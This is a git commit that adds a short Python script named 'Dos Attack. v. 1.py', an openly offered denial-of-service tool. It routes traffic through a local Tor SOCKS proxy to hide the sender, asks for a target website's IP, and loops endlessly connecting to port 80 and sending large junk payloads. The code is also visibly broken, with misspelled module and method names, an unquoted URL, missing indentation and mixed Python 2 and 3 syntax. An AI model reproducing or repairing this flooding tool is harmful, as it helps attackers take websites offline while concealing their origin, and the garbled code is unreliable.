2b7a871857b3e51045aaf1ed07aef91ed54893c3
mohamedmefreh2 <59703363+mohamedmefreh2@users.noreply.github.com>
2020-01-09 21:15:53 +0200

    Create Dos Attack. v. 1.py

---
+++ Dos Attack. v. 1.py
@@ -0,0 +1,15 @@
+import socks
+import socket
+socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
+socket.socket = socks.socksocket
+import requests
+print (requests.get( http://icanhazip.com )).content
+print("Anonymous Alsa8er Dos Attack V.1")
+ip = input ( "Enter ip website: ")
+while True :
+sock = scoket.scoket(socket.AF_INET,scoket.SOCK_STREAM)
+soket.setdefaulttime(1)
+conn = sock.connect((ip,80))
+data = "djjvfuijfdkbvfuijddjjbfykhf" *10000
+sock.send (data)
+print "Attacking for ip ",ip,"port 80"
